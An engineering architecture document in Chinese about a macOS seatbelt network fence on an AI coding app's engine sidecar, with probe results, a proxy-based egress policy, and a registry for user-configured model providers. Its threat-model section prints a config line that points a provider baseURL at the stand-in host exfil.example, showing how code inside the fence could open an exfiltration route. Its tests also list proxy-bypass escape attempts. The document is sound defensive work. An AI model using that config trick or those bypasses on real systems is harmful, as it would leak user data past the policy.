---
title: 网络轴在整进程围栏上重勘破:老裁决的那两行会让引擎起不来
kind: architecture
status: active
owners:
  - alpha-code desktop maintainers
last_reviewed: 2026-09-22
review_after: 2026-12-10
---

# 网络轴(第二轮):接缝从 shell wrapper 换成整进程之后,哪些老结论还成立

2026-08-25 的网络轴勘破 [`2026-08-25-network-egress-seam.md`](2026-08-25-network-egress-seam.md)(`#1077`)
是**对着 REQ-138 的 `cfg.shell` wrapper**做的 —— 被围栏的是一棵**叶子进程树**(shell 工具与
prompt `!command` 的子进程),它从不监听端口。`#1321` 把地基换了:围栏现在装在**引擎 sidecar 自己**
身上(`process-fence-apply.ts`,在 import 引擎之前 `sandbox_init`),而 sidecar **就是那个 HTTP 服务器**。
本文只回答「换了地基之后,网络轴的哪几条要改」,取证在
[`../verification/2026-09-10-req159-1334-packaged-network-fence/README.md`](../verification/2026-09-10-req159-1334-packaged-network-fence/README.md)。

**一句话:老勘破 §1(谓词粒度)/ §2(出网清单)/ §4(选型)照旧成立;§5 写下的那个 profile 形状
照抄到新接缝上会让引擎当场起不来;§7 的两条未验项本轮闭合了(打包态 env-proxy 成立、
`(deny network*)` 的 unix socket 覆盖面已枚举);§3 的咽喉点结论仍成立但覆盖面必须重画。**

## 0. 口径与手段自证

| | |
| --- | --- |
| 仓 | `alpha-code@6a6f4bd37`(`origin/alpha`,worktree `ac-1334`) |
| 宿主 | macOS Darwin 25.3.0 arm64 · `/usr/bin/sandbox-exec` · node v25.8.1(独立探针)/ Electron 42.3.3 内嵌 node(出货 sidecar) |
| 出货形态 | 本机发版命令打的 Developer ID + hardened runtime 签名包,`com.tide.alphacode` 0.1.12,fat `alpha_fence.node`,`codesign --verify --deep --strict` exit 0 |
| 观测面 | ①runner 进程 `existsSync` 实读落盘;②loopback CONNECT 代理的逐条请求日志;③内核 Sandbox 拒绝日志(`log show … eventMessage CONTAINS "deny("`);④真 `sandbox-exec` 试编译器的报错原文 |
| 日期 | 2026-09-10 |

三个手段各自先证明**测得出已知的坏**,再拿去判未知的好:

- 内核日志:`(deny network*)` 下 `nc -U /var/run/syslog` ⇒
  `Sandbox: nc(86248) deny(1) network-outbound /private/var/run/syslog`;同一 profile 下
  `touch /private/tmp/…` ⇒ `deny(1) file-write-create /private/tmp/ac1334-known-bad.txt`。
- 代理日志:控制臂(不追加任何网络行、不设代理 env)读数是 **0 条** —— 它不会幻觉命中。
- 试编译器:一份已知撞墙的 profile 报 `data object length … exceeds maximum (65535)`,一份语法坏的报
  `unbound variable: host`(见 §Q5)。

本轮也踩了两个本仓已登记的坑,一并留痕:zsh 不分词让第一版 unix-socket 探针把七个路径喂成一个参数
(读数 `ERR EINVAL`,看着像「都被拦了」);`log show --start` 认本地时区而 `toISOString()` 是 UTC,
用它做时间窗会得到恒空读数。两处都改掉后才取的数。

## Q1 整进程 network-deny 底座下,引擎还起得来、干得了活吗

### Q1.1 老勘破 §5 写下的那两行,照抄到新接缝上 ⇒ 引擎起不来

§5 的汇流层是:

```
(deny network*)
(allow network-outbound (remote ip "localhost:<chokePort>"))
```

**独立探针**(`fixture/seatbelt-listen-probe.mjs`,被围栏进程 `net.createServer().listen(0,"127.0.0.1")`,
外面一个未被围栏的客户端去连):

| profile 形状 | `listen()` | 外部客户端 |
| --- | --- | --- |
| `(allow default)` 基线 | ok(port 58327) | `CLIENT_GOT=SERVED` |
| **§5 逐字** | **`ERR EPERM`** | 连不上(根本没有端口) |
| §5 + `(allow network-bind (local ip "localhost:*"))` | **`ERR EPERM`** | 同上 |
| §5 + `(allow network-inbound (local ip "localhost:*"))` | ok(58333) | `CLIENT_GOT=SERVED` |
| §5 + inbound(**不加** bind) | ok(58351) | — |

⇒ 让 loopback 监听活下来的那条是 **`network-inbound`**,不是 `network-bind`;只给 `network-bind`
两次都是 `EPERM`。同一批探针里出网方向的读数:放行端口 `ok`、相邻端口 `EPERM`、`1.1.1.1:443` `EPERM`
—— 加法形状仍然精确到单端口(与老勘破 §1.3 一致)。

**出货形态复验**(`sec5` 臂,同一份签名包):围栏装上了 ——
`process fence applied: addon=fence-… profile=2174B` —— 然后引擎在 **560 ms** 内死掉:

```
03:40:55.268  process fence planned: workspaces=1 …, profile=2244B, compile attempts=1
03:40:55.371  (server) process fence applied: … profile=2244B — every process this engine spawns inherits it
03:40:55.816  sidecar spawn failed before health handshake
03:40:55.817  (utility) sidecar exited { code: 1 }
```

health **从来没有 200**;`main.log` / `server.log` / `utility.log` / `crash.log` / 引擎 `opencode.log`
里**没有任何一行点名原因**。这是本轮最贵的一条:**围栏「装上了」不等于引擎活着,而失败在今天是哑的**
—— AC4 那六条 fail-closed 路径覆盖的是「围栏装不上」,不覆盖「围栏装上了、引擎被自己的策略掐死」。

### Q1.2 能工作的最小形状

```
(deny network*)
(allow network-bind    (local  ip "localhost:*"))
(allow network-inbound (local  ip "localhost:*"))
(allow network-outbound (remote ip "localhost:<chokePort>"))
```

(`network-bind` 那行按 Q1.1 是冗余的,但它是 `bind()` 语义的显式声明;要删得自带实测。)
DNS 刻意不放行 —— 走代理的客户端由代理解析,想直连的死在解析这一步(§Q3 实证)。

### Q1.3 六格工作负载逐格(出货形态,`deny` 臂 = 上面这个形状 + **不设**任何代理 env)

| 格 | `open`(出货形状) | `deny` | `choke`(同 `deny` + `HTTP(S)_PROXY` 指向 loopback 代理) |
| --- | --- | --- | --- |
| 1 冷启动 health | 200 | **200** | 200 |
| 1 围栏自报 | `profile=2040B` | `2308B` | `2322B` |
| 2 连接器(MCP stdio) | connected | **connected** | connected |
| 2 **provider 安装** | 26 包 / 62 636 KB × 2 处,`~/.npm/_cacache` 在 | **0 包 × 2 处,`_cacache` 不在** | 26 包 / 62 636 KB × 2 处 |
| 3 开终端(登录 shell 里敲命令) | 通 | **通** | 通 |
| 4 shell 工具 | 通 | **通** | 通 |
| 5 写配置 + ext 装载(`alpha_register` 在) | 通 | **通** | 通 |
| 6 三工作区并集(SIGKILL → self-heal → 重算) | `workspaces=3` | **`workspaces=3`** | `workspaces=3` |
| 集合外落盘 | 0 | 0 | 0 |

**断的只有一格,而且断在最像绿的地方:** 引擎照常起、照常干活,只有 provider 安装死了 ——

```
NpmInstallFailedError (cause: FetchError: request to https://registry.npmjs.org/@opencode-ai%2fplugin
failed, reason: getaddrinfo ENOTFOUND registry.npmjs.org)
```

**而 `/global/health` 仍然 200。** 这正是票面点名的那条静默路径,在新接缝上原样复现:
断的点名规则是 `(deny network*)` **连带拦掉 DNS**(mDNSResponder 的 unix socket,§Q2),
不是某一条端口规则。装上策略层(`choke` 臂)之后这一格 26 包全回来 —— 说明它可修,不是结构性损失。

同臂另外两条**观测**(不是判定,只跑了两轮、没做重复采样):并集重算之后第一条 shell 命令走满
120 s 预算超时、5 s 后重试 200;`renderer.home.catalog_ready` 的时间戳 488 223 ms
(`open`/`choke` 分别 23 402 / 23 541 ms),`main.sidecar.catalog_liveness.confirmed` 本次窗口内没出现。

### Q1.4 覆盖面必须重画:围栏只罩 sidecar 那棵树

Electron **main 不被围栏**(落地形状 §1)。所以整进程 network-deny 之后,
main 的 catalog / auth / updater 出网**一点没变**;renderer 是 Chromium 独立网络栈,同样没变。
老勘破 §6 那张表里「引擎进程内 HTTP(S) = 覆盖(自愿)」这一格现在要改成
**覆盖(强制)** —— 因为围栏就装在那个进程上;而「main / renderer / updater 不覆盖」照旧。

## Q2 `(deny network*)` 到底关掉了什么

老勘破 §1.4 只验了 mDNSResponder 一个例外。三条臂的矩阵(`fixture/unix-socket-probe.mjs`,
`connect()` 到七个系统 unix socket):

| socket | 无围栏 | `(deny network*)` | `(deny network*)` + 逐条 `(literal …)` 放行 |
| --- | --- | --- | --- |
| `/private/var/run/mDNSResponder` | CONNECTED | **EPERM** | CONNECTED |
| `/private/var/run/syslog` | `EPROTOTYPE`(它是 SOCK_DGRAM) | **EPERM** | `EPROTOTYPE` |
| `/private/var/run/systemkeychaincheck.socket` | CONNECTED | **EPERM** | CONNECTED |
| `/private/var/run/cupsd` | CONNECTED | **EPERM** | CONNECTED |
| `/private/var/run/usbmuxd` | CONNECTED | **EPERM** | CONNECTED |
| `/private/var/run/portmap.socket` | CONNECTED | **EPERM** | CONNECTED |
| `/private/var/run/filesystemui.socket` | CONNECTED | **EPERM** | CONNECTED |

⇒ **`(deny network*)` 对 AF_UNIX 是一刀切的,而每一条都能用一行 `(literal …)` 单独放回来**
—— mDNSResponder 不是特例,它只是**第一个被验的**。第三臂逐格回到第一臂读数,证明这不是探针坏了。

**它不覆盖 mach IPC。** 同一份 `(deny network*)` 下 `dscl . -read`、`security find-generic-password`、
`id -un` 读数与无围栏臂**逐字相同**;把 profile 换成 `(deny mach-lookup)` 之后同一组命令分别变成
`Operation failed with error: eServerError` / `parameters … were not valid` / `501`(降级成数字 uid)
—— 对照臂证明探针**看得见 mach 死掉**。所以钥匙串(securityd)、目录服务(opendirectoryd)、
`os_log` 在 deny-all 底座下照常工作;`sidecar.ts:236` 的 `useSystemCertificates()`(读系统钥匙串)
不受影响,`choke` 臂里隧道内的 HTTPS 全部校验通过就是它的正样本。

**引擎实际用到的是哪些**:六格工作负载跑完,`deny` 臂内核日志里我们这棵进程树的 `network-*` 拒绝行
共 **22 条,全部是同一条**:

```
Sandbox: Code Puppy Helper(PID) deny(1) network-outbound /private/var/run/mDNSResponder
Sandbox: curl(PID)              deny(1) network-outbound /private/var/run/mDNSResponder
Sandbox: node(PID)              deny(1) network-outbound /private/var/run/mDNSResponder
Sandbox: git-remote-http(PID)   deny(1) network-outbound /private/var/run/mDNSResponder
```

`open` 臂同一时间窗 **0 条**(手段的负样本)。**除 mDNSResponder 之外,没有任何一个系统 unix socket
被这套工作负载碰过。** 顺带一条:TCP 层的拒绝行一条也没有 —— 因为所有客户端都先死在解析这一步,
根本没走到 `connect()`。想看 TCP 层 EPERM 要用独立探针(§Q1.1 的第三列)。

## Q3 误伤语料在新底座上重跑

文件轴 §2.8 的九条(逐字照 `#1076` 的 `run.ts`)+ 本轴新增三条,全部经**出货 sidecar 的 shell 工具**跑:

| 语料 | `open` | `deny` | `choke` |
| --- | --- | --- | --- |
| 工作区内写 | ok | ok | ok |
| `/private/tmp` 写 | ok | ok | ok |
| `git init` + commit(40 位 sha) | ok | ok | ok |
| `node` 写 TMPDIR | ok | ok | ok |
| 读仓库文件 | ok | ok | ok |
| `mkdir -p d1/d2/d3/d4` | ok | ok | ok |
| `grep` | ok | ok | ok |
| `which git node` | ok | ok | ok |
| `curl https://example.com` | `CURL=200` | **`CURL=000`,`curl: (6) Could not resolve host`** | `CURL=200` |
| `npm view semver version` | `7.8.5` | **`npm error network …`** | `7.8.5` |
| `git ls-remote https://github.com/git/git` | `b8242b0…` | **`fatal: unable to access …: Could not resolve host: github.com`** | `b8242b0…` |
| `node dns.lookup("example.com")` | `198.18.7.158` | **`ENOTFOUND`** | `ENOTFOUND` |

**九条里八条与网络无关的在三条臂上逐格相同;唯一变的是 `curl` 那一条,而且它变的方式是「解析不了」
而不是「连不上」。** 加的三条把这句话钉死:装上策略层之后 npm 与 git 立刻回到 `open` 臂读数,
而 `dns.lookup` 仍然 `ENOTFOUND` —— **能干活不是因为 DNS 回来了,是因为解析被搬到了代理那一侧**。
这正是老勘破 §5「DNS 默认不放行」那句写法纪律在真工作负载上的第一次证实。

## Q4 引擎自身的出网现在从哪走(打包产物复验,老勘破 §7 首条闭合)

判据是**代理日志里有没有那条 CONNECT**,不是有没有报错。探针:注册一个远端 MCP,URL 指向
`http(s)://ac1334-probe.invalid/mcp` —— 结构上不可解析,而且**只有引擎进程内的 fetch 会发起它**。

| 臂 | 引擎侧读数 | 代理日志 |
| --- | --- | --- |
| `open`(无代理 env) | `fetch failed: getaddrinfo ENOTFOUND ac1334-probe.invalid` | **0 条**(直连) |
| `deny`(围栏在,无代理 env) | `fetch failed: getaddrinfo ENOTFOUND ac1334-probe.invalid` | **0 条** —— 流量不会自己汇过来 |
| `choke`(围栏在 + `HTTP(S)_PROXY`) | `fetch failed: Error: Request was cancelled.: Proxy response (502) !== 200 when HTTP Tunneling` | **`connect ac1334-probe.invalid:80` ×2、`:443` ×2** |

⇒ **打包产物里 `sidecar.ts:145` 的 `useEnvProxy()` 确实生效**:引擎进程内的 fetch(远端 MCP 这条路)
在 hardened runtime + `utilityProcess` 的 node 上照样被 `setGlobalProxyFromEnv()` 接管,
拒绝时**响亮**(`Request was cancelled.` + `Proxy response (502)`)。老勘破 §3.1 在 dev 二进制上
量到的三态,在出货形态成立。`deny` 臂那一行同样重要:**没有代理 env,seatbelt 只会把流量掐死,
不会把它汇到任何地方** —— 强制层与策略层缺一不可(老勘破 §5 的结论照旧)。

`choke` 臂代理日志共 32 条,还看到 `registry.npmjs.org:443`(sidecar 里的 `@npmcli/arborist`)、
`github.com:443` / `example.com:443` / `release-assets.githubusercontent.com:443`(shell 工具的子进程)。

**两条未验,不许从本轮读数外推:**

1. **代理日志不区分发起进程。** `codepuppy.cn:443`(catalog)与 `alpha-gateway.tidelabs.click:443`
   也出现在日志里,但 main 自己也调 `useEnvProxy()`(`index.ts:200`)且继承同一份 env
   —— 无法判断这两族是 main 发的还是 sidecar 发的。
2. **模型目录那条 fetch 本轮没有发生。** 引擎的目录源是 `https://models.opencode.ai`
   (`packages/core/src/models-dev.ts:160`,5 分钟 TTL,缓存在 `<XDG_CACHE_HOME>/opencode/models.json`);
   四条臂的代理日志里**一次都没有它**,四条臂的缓存文件**都不存在**。所以「models 目录拉取是否经代理」
   本轮**未验**;「没看见」不是结论。
3. **没有发过一次真的模型请求**(与 `#1321` / `#1323` 同一条)。

## Q5 profile 的字节上限还够吗

用**生产渲染器** + **真编译器**(`fixture/profile-byte-budget.ts`),根取本机生产值
(`~/Library/Application Support/…`):

| 工作区数 | 无网络行 | §5 两行 | 能工作的四行 | 四行 + mDNSResponder |
| --- | --- | --- | --- | --- |
| 1 | 1 353 B | 1 424 B | 1 519 B | 1 587 B |
| 3 | 1 587 B | 1 658 B | 1 753 B | 1 821 B |
| 5 | 1 821 B | 1 892 B | 1 987 B | 2 055 B |
| 32(`MAX_WORKSPACES`) | 4 980 B | 5 051 B | 5 146 B | 5 214 B |

出货形态实读(隔离布局下路径更长):`open` 2 040 B(1 ws)/ 2 218 B(3 ws);
加网络行后 2 308 B / 2 486 B;加网络行 + 代理端口 2 322 B / 2 502 B。**网络行的净成本 234–268 B。**

**墙在哪:四条臂完全一样。** 二分到第一条编不过的工作区数,四条臂都是 **1 264**,
且第 1 265 条时编译器报的数字**逐字相同**:`data object length 65574 exceeds maximum (65535)`。
每多一个工作区 +51 B(1265→65574、1266→65625、1267→65676)。
**⇒ 在 `MAX_WORKSPACES=32` 这个封顶下,离墙还有约 39 倍余量;网络行不改变这个余量。**

一条手段自证,不写下来就会误导下一个人:上面「四条臂数字相同」第一次量到时,我以为它证明
「网络行不喂那个数据对象」。**那是错的** —— 编译器在文件侧先撞墙就停了,网络侧的贡献根本没被算进去。
把工作区降到 1(远离文件侧的墙)再灌网络路径字面量,数字立刻动:400 条 180 字符的
`(literal …)` ⇒ `67450`;1 200 条 ⇒ `202279`(边际 ≈ 168 B/条 ≈ 字符串长度本身);
3 000 条时换成另一种失败 `Assertion failed: (diff <= INSTR_JUMP_NE_MAX_LENGTH) … serialize.c:240`。
**网络路径字面量与文件路径字面量喂的是同一个 65535 对象**;只是我们要加的那几行小到量不出来。

### 这对 `trimUntilCompiles` 意味着什么

裁剪器只丢工作区、网络行不可丢 —— 按上面的余量,这在字节维度上**不成问题**。
真问题在**归因**:网络行若写坏了(比如照老勘破 §1.1 已证不存在的 `(remote host "models.dev")`),
裁剪器会把工作区一路丢光再抛,而抛出来的话是:

```
process fence profile does not compile even with the minimum writable set
(1 workspace, 4 dropped, 5 attempts): sandbox-exec: unbound variable: host … line 25, column 33
```

**五次试编译、丢掉四个工作区,而错根本不在并集大小。** 运维读到的第一句是「最小可写集都编不过」,
下一步很容易去查工作区。实现票要么在渲染网络行之后**先单独试编一次**(把语法错与并集大小分开归因),
要么让裁剪器在丢第一个工作区之前先判「上一次失败原因是不是 `exceeds maximum`」。

## 老结论分档

### 仍然成立(本轮未重测,或重测后一致)

- §1.1 SBPL 写不出目的地(主机名 / IP / 网段),可表达粒度 = {any, loopback} × 端口 × {tcp,udp}。
  本轮反面证据:`(remote host "models.dev")` 仍报 `unbound variable: host`(§Q5)。
- §1.2 解析错误时进程不启动,空输出长得像「拦住了」——本轮 `sec5` 臂是它的升级版:
  **profile 解析通过、围栏装上了、进程照样没起来**,而且这次连报错都没有(§Q1.1)。
- §1.3 只写加法、不写减法;加法精确到单端口(本轮独立探针再证)。
- §1.5 端口白名单 host-blind ⇒ 单靠 seatbelt 的「网络闸门」是假闸门。
- §2 出网清单与 §2.1 的 fake-IP 拓扑(本轮 `open` 臂实读 `example.com` = `198.18.7.158`)。
- §4 选型:seatbelt 做强制汇流、本地 CONNECT 代理做目的地策略,两者缺一不可
  —— `deny` 臂(只有强制层)与 `choke` 臂(两层都有)的对照就是它的正反臂。
- §5 的**写法纪律**(只加法、禁 `localhost:*` + 端口特定 deny 的组合、DNS 默认不放行)。

### 已被推翻 / 必须改写

| 老结论 | 本轮读数 | 改写成 |
| --- | --- | --- |
| §5 的汇流层 profile 就是那两行 | 照抄到新接缝 ⇒ `listen()` `EPERM` ⇒ 引擎 560 ms 内 exit 1,health 从来没 200(§Q1.1) | 必须补 `(allow network-inbound (local ip "localhost:*"))`;`network-bind` 单独给不够 |
| §3.2「强制层不能罩在 sidecar 上,只能罩 C1 wrapper」 | `#1321` 已经罩在 sidecar 上了(`sandbox_init`,不需要 exec 缝) | 强制层的落点是 sidecar 自己;C1 wrapper 已随 `#1321` 拆除 |
| §6 表「引擎进程内 HTTP(S) = 覆盖(自愿)」 | 围栏就装在这个进程上 | 覆盖(**强制**);"自愿"只剩下「汇到哪」这一半(靠 env) |
| §6 表「MCP stdio / LSP 不覆盖(本轮)」 | 全部继承 sidecar 的围栏 | 覆盖(强制),无需逐个收编 |
| §7 首条「打包 sidecar 上未复跑 `useEnvProxy()`」 | 出货形态三臂对照成立(§Q4) | 闭合 |
| §7 末条「`(deny network*)` 对 unix socket 的覆盖范围未枚举」 | 七个 socket 三臂矩阵 + 真工作负载的内核日志枚举(§Q2) | 闭合:一刀切、逐条可放回、不覆盖 mach;引擎实际只碰 mDNSResponder |
| §7 「误伤语料要在 network-deny 底座上重跑」 | 九条 + 三条,三臂逐格(§Q3) | 闭合 |

### 仍未验(本轮**没有**改变这些的状态)

- **真模型请求一次都没发过** ⇒ 票面担心的「提问没反应」这条用户可观察面**没有直接测到**。
  **2026-09-21 补记:这条未验直接变成了出货缺陷** —— 自带 Key 直连的模型自 0.1.13 起整类发不出消息
  (`#1379`,见下方《授权的第二个半场》)。留着这行原文,是因为它当时就把风险写对了。
- **模型目录 `models.opencode.ai` 的 fetch 本轮没有发生** ⇒ 它是否经代理未验(§Q4)。
- **代理日志不区分 main 与 sidecar** ⇒ catalog / gateway 两族出网的归属未验(§Q4)。
- ssh 经 CONNECT 端到端(老 §7 第二条)、bun 作为运行时的完整代理语义(第三条)、
  拓扑 A(本机 7897 系统代理)下的复跑(第四条)、electron-updater 是否服从 env-proxy(第五条)。
- `deny` 臂的两条时序读数(并集重算后首条命令 120 s 超时、`catalog_ready` 488 s)只跑了两轮,
  按《时序门需 ≥3 轮采样》**不构成结论**。
- 公证 / staple;x86_64 那一片没有被执行过;单机单配置单拓扑。

## 落地(`#1337`,2026-09-10)

上面的读数在 `#1337` 里变成了代码。落地形状,每一行都能在树上指到:

| 层 | 文件 | 事实 |
| --- | --- | --- |
| 强制层(profile) | `packages/ui-mac/src/main/process-fence-profile.ts` N1–N4 | 可写集之后追加 §Q1.2 那四行**逐字**:`(deny network*)` + loopback `network-bind` / `network-inbound` + 只放行 `localhost:<代理端口>` 出网。只写加法;DNS 刻意不放行。端口不是 1..65535 的整数 ⇒ 拒绝渲染 |
| 策略层(代理) | `packages/ui-mac/src/main/server.ts` `ensureEgressPolicyProxy` → `network-egress-proxy.ts` | 代理跑在 **Electron main 进程内**(围栏外,`#1073` 裁决三:`(deny network*)` 连带拦 DNS,解析只能在围栏外做),第一次 fork 之前起、跨 respawn 复用;起不来 ⇒ 拒 fork。授权只问 `network-egress-registry.ts`(**`#1379` 起**:问的是静态表 ∪ 动态半场,见下节) |
| 汇流(env) | `sidecar-env.ts` `sidecarEgressProxyEnv` | fork 之前把 sidecar 的八个代理变量**整份改写**:`HTTP(S)_PROXY` / `ALL_PROXY`(大小写)指向代理,`NO_PROXY` 只留 loopback —— 用户自己的代理与 NO_PROXY 名单不存活(唯一通路)。main 自己的 `process.env` 一个字不动 |
| 归因 | `process-fence-profile.ts` `trimUntilCompiles` | 编译失败若不是 `exceeds maximum` 那道字节墙 ⇒ 一个工作区都不丢就抛,消息点名「丢工作区救不了」(§Q5 末节) |
| 判据 | `network-egress-fence.test.ts`(Electron 的 node + 真 .node + 真 seatbelt + 真代理)· `process-fence-wiring.test.ts` · `process-fence-profile.test.ts` · `sidecar-env.test.ts` · `network-egress-disclosure.test.ts` | 逃逸语料(绕代理直连 / raw-IP:443 / UDP / `[::1]` 其它端口 / DNS)逐条 EPERM 而唯一那扇门通、外面连得进被围栏的监听者;代理关掉后 fetch / CONNECT **立刻** `ECONNREFUSED` 并点名代理地址(不是挂到超时),直连仍 EPERM;控制臂(不套围栏)对同一判据必红 |
| 出货形态 | [`../verification/2026-09-10-req137-1337-packaged-egress/README.md`](../verification/2026-09-10-req137-1337-packaged-egress/README.md) | 六格 + 误伤语料 + 逃逸语料在签名包上的读数(两处 provider 目录实读包数) |

**没有改的**:代理本体与注册表(`#1336`)、可写集的文件规则、并集裁剪规则、main / renderer 的出网。非 darwin 没有围栏,
也不装策略层(那里的引擎本来就没有围栏,不假装有一半)。

## 授权的第二个半场(`#1379`,2026-09-21)

`#1336` / `#1337` 落地的注册表是**纯静态**的;而上面《仍未验》第一条写着「真模型请求一次都没发过」。
这两件事合起来在 0.1.13 出货:**自带 Key 直连的模型整类发不出消息**,持续九天无人报告
(owner 日常用的是断点之前的 dev 渠道 0.1.11)。

现场读数(owner 机器,0.1.14 正式包,`#1379` 票面):

```
{"event":"egress.connect","authority":"open.bigmodel.cn:443","verdict":"deny","reason":"unregistered","status":403}
{"event":"egress.connect","authority":"api.deepseek.com:443","verdict":"deny","reason":"unregistered","status":403}
{"event":"egress.connect","authority":"alpha-cloud.tidelabs.click:443","verdict":"allow","status":200}
```

同一次启动 `alpha-secrets sync: wrote [… DEEPSEEK_API_KEY, ZHIPU_API_KEY]` —— **密钥在**,拦它的是我们自己。

**为什么不是「表里少了两行」。** BYOK 的 baseURL 由**用户配置了谁**决定,注册表抬头早就把它列进「动态」类别。
补上 DeepSeek 与智谱,下一个供应商照样 403 —— 而「下一个供应商」正是这条路的卖点。手写清单与缺陷同形。

**修法:授权从此有两个半场,合起来才是权威。**

| 半场 | 文件 | 内容 | 谁写 |
| --- | --- | --- | --- |
| 静态 | `packages/ui-mac/src/main/network-egress-registry.ts` | 应用自己**总会**去连的地址(平台四族、包管理源、GitHub、LSP 下载站…) | 常量,冻结;改它 = 改代码 + 在 PR 里带出处坐标 |
| 动态 | `packages/ui-mac/src/main/network-egress-derived.ts` | **这一代**注入面里的 BYOK 目的地(目录 baseURL × 密钥文件在场) | 用户 —— 在模型选择器里给某一家填 Key |

派生的唯一权威是**引擎真正会去连的那个值**:有效配置里 `provider.<id>.options.baseURL`(回退字段 `api`;
字段选择与 v2 桥 `alpha-config-injection.ts:457-462` 逐字同源 —— `options.baseURL` **是字符串就赢**,
回退条件是它不是字符串,而不是「它派生失败」)。

输入**只有一个**:`buildAlphaModelConfig(userDataPath).provider`。目录 BYOK 节点只在**密钥文件在场**时
才出现,也就是说「用户配过这一家」在这里已经是一个文件在不在的问题;sidecar 侧 `injectAlphaConfig` 调的是
**同一个函数、同一个 `userDataPath`**,而密钥文件刚由同一次 `syncSecretFiles` 落定 ⇒ 两边结构上不可能分叉。

### 为什么**不读**配置文件(`#1380` R1 Blocker,合并前拦下)

第一版还读了「文件面」—— `alpha.jsonc` / `<XDG_CONFIG_HOME>/opencode` / `~/.opencode` 里的 provider 块,
理由是用户自建节点的 baseURL 只住在那里。**那是一个 confused deputy**:这三条路径逐条落在 seatbelt 的
**可写集**里(`process-fence-profile.ts` 的 W2 `alphaGlobalRoot` / W6 `<configHome>/opencode` /
W16 `<home>/.opencode`),也就是**被围栏的引擎树自己写得了**的地方。于是引擎树里任意一段代码
(bash 工具、被打开仓库自带的 plugin、MCP stdio 子进程)只要写一行

```
{"provider":{"x":{"options":{"baseURL":"https://exfil.example"}}}}
```

—— 这个写操作在围栏内是**被允许**的 —— 下一次 fork 后 `exfil.example:443` 就进了放行集合,代理照建隧道。
围栏那一整面对任意目的地开口,而产品披露的「只能访问已登记的地址」当场变成假话,且没有任何闸会红。

所以「有效配置」在这里必须**窄读成围栏外的那一半**:catalog 的 baseURL 是编译进包的常量,密钥文件由 main 在
fork 前 `syncSecretFiles` 收敛(不在 wanted 集合里的遗留文件当场扫掉),两者都不在引擎的可写集里。
`#1392`(2026-09-22)之前,注入面对文件里的那些 id 只贡献 `enabled_providers` 与 `options.apiKey`、从不贡献 baseURL,
用户手工添加的自定义节点因此**仍然被拒**(它的 baseURL 只住在那个可写文件里)。**现在**:自定义节点的记录整体搬进了
`<appData>/alpha-code-state/custom-providers/<env>.json`(`#1391` 真源,只有 main 写、不在任何可写根之下;方案基线
[`../design/2026-09-21-1383-custom-provider-address-truth-baseline.md`](../design/2026-09-21-1383-custom-provider-address-truth-baseline.md)),
注入面(`alpha-models.ts` 第 (3) 段)从它发出**完整块**(npm / name / baseURL / models / `{file:}` 密钥引用),本模块零改动就把
它们算进放行集合;三处配置文件的 `provider.*` 对 `enabled_providers`、注入表与放行集合**一概不算数**(基线 I1)。引擎原生仍会合并
`alpha.jsonc`,让它写的块失效的机制是 `enabled_providers` 整体替换 + 注入完整块(同 id 后合并者赢),判据因此是端到端的:
`custom-provider-derivation.test.ts` 起真引擎问清单 —— 真源节点在清单里且被放行,alpha.jsonc / XDG 里的节点两边都进不了。
添加时的地址准入与这里的四条准入是**同一个函数**(`classifyBaseUrl`):围栏放不了的地址(http、loopback)在添加那一刻就被拒并说明原因。
升级后配置文件里既有的 provider 块只忽略 + 一行日志(main 每进程一次),不采信、不迁移、不建「待确认」面(基线 I3)。

准入四条(有一条不过就是不收,不猜、不修补):`new URL()` 解析得出 / scheme 是 `https:` / host 不是 loopback /
host 过**静态表同一个** `isEgressHostShape`(同一个函数,不是抄一份正则)。产物仍是**精确 `host:port`**;
不做通配、不做后缀、不做 IP↔名字等价(理由同 §2.1 的 fake-IP 拓扑)。
生命周期是**整份替换、每代一次**:配置结构性变化本来就会 `respawning sidecar { reason: 'structural' }`,
用户删掉一家,下一代就不再放行它;代理是跨 respawn 复用的单例,但它每条 CONNECT 都现问 ⇒ 换代即生效。
派生失败(配置读坏)**清空**而不是沿用上一代 —— 那是 fail-closed 的方向,代价是这一代 BYOK 被 403 而非全应用起不来。

**本轮仍然不覆盖的**(如实列出,不要在别处读成已闭合):

1. ~~**用户手工添加的自定义节点**(`provider.<id>.options.baseURL` 只住在可写配置文件里)~~ —— **已闭合(`#1391` / `#1392`,2026-09-22)**:
   记录搬进围栏写不到的真源文件,注入面从它发出完整块,本模块照旧只读注入面就把它放行;配置文件里的节点从此两边都不算数(见上节)。
2. **BYOK 指向 loopback 的 baseURL**(本机模型 / ollama 一类)—— **owner 2026-09-21 裁决:不再支持本地模型,
   这件事不做了**,作废 9-10 那条「要单独设计本机目的地怎么走」。技术事实不变(围栏只放行代理端口、`NO_PROXY`
   又含 loopback ⇒ 放行它不会让它可达,只会让登记簿说假话),但它现在是一条**已关闭**的分支,不是待办。
3. **用户配置的远程 MCP URL** —— 同属「动态」类别,本轮没做。
4. ~~**被拒时界面上的归因**~~ —— **已闭合(`#1382`,2026-09-21)**。代理的 403 正文
   (`alpha egress policy: <authority> denied (reason=unregistered) — blocked by this app's local egress policy …`)
   此前**没有任何读者**,界面把它当成一次普通的调用失败;现在它是一份**被消费的线契约**:
   格式住在 `packages/ui-mac/src/shared/egress-denial.ts`(`egressDenialLine` 拼、`egressPolicyDenialOf` 认,
   producer 与 consumer 共用一份字面量),渲染层 `timeline-model.ts` 的 `turnErrorOf` 据此给回合级错误行
   加一格 `egressDenied: { authority }`,`TurnErrorCard` 把正文换成「这台电脑上的网络策略拦下了这次请求 ——
   `<authority>` 不在本应用允许访问的地址名单里」。
   **判据细到 `reason=unregistered` 这一格**:同一个前缀还会出现在 `dial-failed` / `bad-authority` /
   `method-not-connect` 三种正文里,而那三种不是「策略说不」;只按前缀匹配会把「登记了但连不上」
   说成「被策略拦下」,把人引去查放行名单。归因说错比不归因更坏。

判据:

- `network-egress-derived.test.ts` —— **从真配置派生**,不是喂夹具;MUST_DENY 十条经一个判据函数判定,
  再拿三种「本该被拒却放行」的放宽(默认放行 / 后缀匹配 / 忽略端口)证明那个判据点得出它们;
  loopback 四种写法一条都派生不出、绕过派生直接塞也塞不进;
  **B1 那一格**把三条 provider 读取路径全指进临时目录、各写一个 `exfil.example` 的 provider,断言
  ①那几个 id 真的进了 `enabled_providers`(文件确实被读到,断言不是空跑)②注入面对它们
  `options.baseURL` 恒 `undefined` ③放行集合里只有目录 BYOK 那一条。控制臂照旧实现读那三个文件,
  证明它们确实躺着一条可利用的 baseURL 且读它就会授权 `exfil.example:443`。
- `process-fence-wiring.test.ts` 的 `#1379` 那条 —— 真的 `spawnLocalServer`,fork 之前装进授权集合:
